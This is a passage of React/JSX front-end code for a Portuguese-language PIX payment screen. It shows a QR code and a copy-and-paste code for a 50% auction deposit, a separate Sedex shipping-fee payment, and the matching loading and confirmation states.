                        </p>
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                          <span style={{ fontSize: 13, color: "#555", fontWeight: 700 }}>Frete Sedex</span>
                          <span style={{ fontSize: 20, fontWeight: 900, color: CB_BLUE }}>{formatBRL(FRETE_AMOUNT)}</span>
                        </div>
                      </div>
                    </div>

                    {fretePixPaid ? (
                      <div style={{ textAlign: "center", paddingTop: 8 }}>
                        <div style={{ width: 52, height: 52, borderRadius: "50%", backgroundColor: "#f0fdf4", border: "2px solid #86efac", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 10px", fontSize: 24 }}>✓</div>
                        <p style={{ fontSize: 15, fontWeight: 900, color: "#166534", marginBottom: 4 }}>Frete pago! Arrematação concluída.</p>
                        <p style={{ fontSize: 12, color: "#555", lineHeight: 1.6 }}>
                          Sua entrega foi agendada. Você receberá o código de rastreamento em breve.
                        </p>
                      </div>
                    ) : freteLoading ? (
                      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 12, paddingTop: 8 }}>
                        <div className="spin" style={{ width: 32, height: 32, borderRadius: "50%", border: "3px solid #e0e0e0", borderTopColor: CB_BLUE }} />
                        <p style={{ fontSize: 12, color: "#777" }}>Gerando PIX do frete...</p>
                      </div>
                    ) : fretePixCode ? (
                      <>
                        <div style={{ textAlign: "center" }}>
                          <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 8 }}>QR Code PIX — Frete</p>
                          <img
                            src={qrUrl(fretePixCode)}
                            alt="QR Code PIX frete"
                            style={{ width: 180, height: 180, display: "block", margin: "0 auto", borderRadius: 8, border: "1px solid #e0e0e0" }}
                          />
                        </div>
                        <div>
                          <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 6 }}>Código PIX copia e cola</p>
                          <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "10px 12px", wordBreak: "break-all", fontSize: 11, color: "#333", lineHeight: 1.6, marginBottom: 8 }}>
                            {fretePixCode}
                          </div>
                          <button onClick={handleFreteCopy} style={{ display: "block", width: "100%", padding: "12px", backgroundColor: CB_BLUE, color: "white", fontWeight: 900, fontSize: 13, borderRadius: 8, border: "none", cursor: "pointer" }}>
                            {freteCopied ? "Copiado!" : "Copiar código PIX do frete"}
                          </button>
                        </div>
                        <div style={{ display: "flex", alignItems: "center", gap: 10, paddingTop: 4 }}>
                          <div className="spin" style={{ width: 16, height: 16, borderRadius: "50%", border: "2px solid #e0e0e0", borderTopColor: CB_BLUE, flexShrink: 0 }} />
                          <p style={{ fontSize: 12, color: "#777" }}>Aguardando confirmação do pagamento do frete...</p>
                        </div>
                      </>
                    ) : null}
                  </>
                );
              }

              // ── PIX do produto (aguardando pagamento) ──
              return (
                <>
                  <div>
                    <p style={{ fontSize: 13, fontWeight: 900, color: "#222", marginBottom: 4 }}>Pague via PIX</p>
                    <p style={{ fontSize: 12, color: "#777" }}>Copie o código abaixo e pague em qualquer aplicativo bancário.</p>
                  </div>
                  <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "12px 14px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline" }}>
                      <div>
                        <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 4 }}>Valor a pagar agora (50%)</p>
                        <p style={{ fontSize: 22, fontWeight: 900, color: CB_BLUE }}>{formatBRL(pixAmount)}</p>
                      </div>
                      <div style={{ textAlign: "right" }}>
                        <p style={{ fontSize: 10, color: "#bbb", marginBottom: 2 }}>Restante na entrega</p>
                        <p style={{ fontSize: 13, fontWeight: 700, color: "#999" }}>{formatBRL(pixAmount)}</p>
                      </div>
                    </div>
                  </div>
                  {pixCode && (
                    <>
                      <div style={{ textAlign: "center" }}>
                        <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 8 }}>QR Code PIX</p>
                        <img
                          src={qrUrl(pixCode)}
                          alt="QR Code PIX"
                          style={{ width: 200, height: 200, display: "block", margin: "0 auto", borderRadius: 8, border: "1px solid #e0e0e0" }}
                        />
                      </div>
                      <div>
                        <p style={{ fontSize: 11, color: "#999", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.4px", marginBottom: 6 }}>Código PIX copia e cola</p>
                        <div style={{ backgroundColor: "#fafafa", border: "1px solid #ebebeb", borderRadius: 8, padding: "10px 12px", wordBreak: "break-all", fontSize: 11, color: "#333", lineHeight: 1.6, marginBottom: 8 }}>
                          {pixCode}
                        </div>
                        <button onClick={handleCopy} style={{ display: "block", width: "100%", padding: "12px", backgroundColor: CB_BLUE, color: "white", fontWeight: 900, fontSize: 13, borderRadius: 8, border: "none", cursor: "pointer" }}>
                          {copied ? "Copiado!" : "Copiar código PIX"}
                        </button>
                      </div>
                    </>
                  )}
                  <div style={{ display: "flex", alignItems: "center", gap: 10, paddingTop: 4 }}>
                    <div className="spin" style={{ width: 16, height: 16, borderRadius: "50%", border: "2px solid #e0e0e0", borderTopColor: CB_BLUE, flexShrink: 0 }} />
                    <p style={{ fontSize: 12, color: "#777" }}>Aguardando confirmação do pagamento...</p>
                  </div>
                </>
              );
            })()}

          </div>
        </div>
      </div>
    </>
  );
}
